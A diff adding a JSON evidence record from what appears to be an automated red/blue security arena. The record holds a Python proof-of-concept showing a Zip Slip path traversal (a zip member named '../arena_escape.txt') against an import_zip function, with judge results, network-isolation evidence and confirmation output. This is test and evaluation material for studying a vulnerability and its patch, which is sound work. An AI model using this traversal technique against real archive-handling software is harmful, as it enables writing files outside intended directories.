@@ -1,0 +1,90 @@
+{
+  "exploit_py": "#!/usr/bin/env python3\n\"\"\"\nRed exploit for battle-004: demonstrates Zip Slip path traversal in import_zip.\nExecuted by judge as: python red_exploit_submission.py --expect-vulnerable\n\"\"\"\n\nimport argparse\nimport sys\nimport tempfile\nfrom pathlib import Path\nfrom zipfile import ZipFile, ZipInfo\n\nfrom app import import_zip\n\nCONFIRMATION = \"RED_EXPLOIT_CONFIRMED\"\n\n\ndef build_traversal_zip(zip_path: Path, payload: str) -> None:\n    info = ZipInfo(\"../arena_escape.txt\")\n    with ZipFile(zip_path, \"w\") as zf:\n        with zf.open(info, \"w\") as member:\n            member.write(payload.encode(\"utf-8\"))\n\n\ndef observed_escape(written, destination: Path, escape_file: Path, payload: str) -> bool:\n    if not escape_file.is_file():\n        return False\n    try:\n        if escape_file.read_text(encoding=\"utf-8\") != payload:\n            return False\n    except OSError:\n        return False\n\n    escaped_path = escape_file.resolve()\n    dest_path = destination.resolve()\n    if escaped_path == dest_path or dest_path in escaped_path.parents:\n        return False\n\n    inside_control = destination / \"arena_escape.txt\"\n    if inside_control.exists():\n        return False\n\n    try:\n        returned_points_to_escape = any(Path(item).resolve() == escaped_path for item in written)\n    except Exception:\n        returned_points_to_escape = False\n\n    return returned_points_to_escape\n\n\ndef main() -> int:\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"--expect-vulnerable\", action=\"store_true\")\n    args = parser.parse_args()\n\n    payload_text = \"zip-slip traversal evidence via ZipInfo\\n\"\n\n    with tempfile.TemporaryDirectory(prefix=\"red_zipinfo_slip_\") as tmpdir:\n        root = Path(tmpdir).resolve()\n        destination = root / \"import_workspace\"\n        zip_path = root / \"payload.zip\"\n        escape_file = root / \"arena_escape.txt\"\n\n        build_traversal_zip(zip_path, payload_text)\n\n        try:\n            written = import_zip(zip_path, destination)\n        except Exception as exc:\n            if args.expect_vulnerable:\n                print(f\"import_zip raised unexpectedly: {exc}\", file=sys.stderr)\n                return 1\n            return 0\n\n        vulnerable = observed_escape(written, destination, escape_file, payload_text)\n\n        if args.expect_vulnerable:\n            if vulnerable:\n                print(CONFIRMATION)\n                return 0\n            print(\"Traversal write was not observed outside destination\", file=sys.stderr)\n            return 1\n\n        return 1 if vulnerable else 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
+  "inputs": {
+    "g1a_outcome": {
+      "duration_seconds": 1.195406,
+      "patched_bypass": false,
+      "vulnerable_original_confirmed": true
+    },
+    "g1b_outcome": {
+      "duration_seconds": 1.260919,
+      "patched_bypass": false,
+      "vulnerable_original_confirmed": true
+    },
+    "selected_g1_evidence_packet_ref": "arena-adaptive-lineage-20260720T144034Z:battle.parent_evidence_packet.v1:G1-A",
+    "selected_g1_id": "G1-A",
+    "selection_receipt_ref": "arena-adaptive-lineage-20260720T144034Z-lineage-selection"
+  },
+  "judge_attempts": 1,
+  "judge_outcome": {
+    "duration_seconds": 1.285213,
+    "patched_bypass": false,
+    "vulnerable_original_confirmed": true
+  },
+  "mutation_operator": "failure_guided_crossover",
+  "network_summary": {
+    "available": true,
+    "capture_method": "docker_network_namespace_posture",
+    "capture_requested": true,
+    "egress_permitted": false,
+    "evidence": {
+      "docker_network_flag": "none",
+      "exploit_confirmed_before_patch_under_isolation": true,
+      "exploit_still_succeeds_after_patch": false
+    },
+    "full_packet_capture_proven": true,
+    "http_requests": [],
+    "http_responses": [],
+    "network_isolation": "none",
+    "observation": "Exploit executes in-process against app.py:import_zip inside a Docker container launched with `docker run --network none`. With --network none the container has no network namespace, so zero HTTP/socket egress is possible; the Zip-Slip proof is filesystem-only. Vulnerability confirmed on original target: True; exploit still succeeds after patch: False.",
+    "packets_observed": 0,
+    "protocol": "in_process_function_call",
+    "reason": null,
+    "target": "app.py:import_zip",
+    "transport": "python_import_and_direct_call"
+  },
+  "parent_evidence_packet_ref": "arena-adaptive-lineage-20260720T144034Z:battle.parent_evidence_packet.v1:G1-A",
+  "source_sha256": "45fea0a3d1bb1fcaad32ca8f77a808cb7ae5b61ea7a68928754c2bd8d21b3b8b",
+  "specimen_id": "G2",
+  "stderr": {
+    "after": {
+      "artifact_uri": "judge/replays/red-1-G2__blue-0/judge-red-exploit-patched.stderr.txt",
+      "char_count": 0,
+      "exit_code": 0,
+      "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "text": "",
+      "truncated": false
+    },
+    "available": false,
+    "before": {
+      "artifact_uri": "judge/replays/red-1-G2__blue-0/judge-red-exploit-original.stderr.txt",
+      "char_count": 0,
+      "exit_code": 0,
+      "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "text": "",
+      "truncated": false
+    },
+    "stream": "stderr"
+  },
+  "stdout": {
+    "after": {
+      "artifact_uri": "judge/replays/red-1-G2__blue-0/judge-red-exploit-patched.stdout.txt",
+      "char_count": 0,
+      "exit_code": 0,
+      "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "text": "",
+      "truncated": false
+    },
+    "available": true,
+    "before": {
+      "artifact_uri": "judge/replays/red-1-G2__blue-0/judge-red-exploit-original.stdout.txt",
+      "char_count": 22,
+      "exit_code": 0,
+      "sha256": "f14ac99734a447243011863a81c4a6a5a8b9de120099130dd55d6dc1f09cd2f9",
+      "text": "RED_EXPLOIT_CONFIRMED\n",
+      "truncated": false
+    },
+    "stream": "stdout"
+  },
+  "technique_delta": "Changed app loading from importlib/getattr to direct from-import, changed archive construction from writestr to ZipInfo plus zf.open member write, changed target call to pass Path objects, and strengthened the oracle with escaped file content plus returned-path resolution."
+}
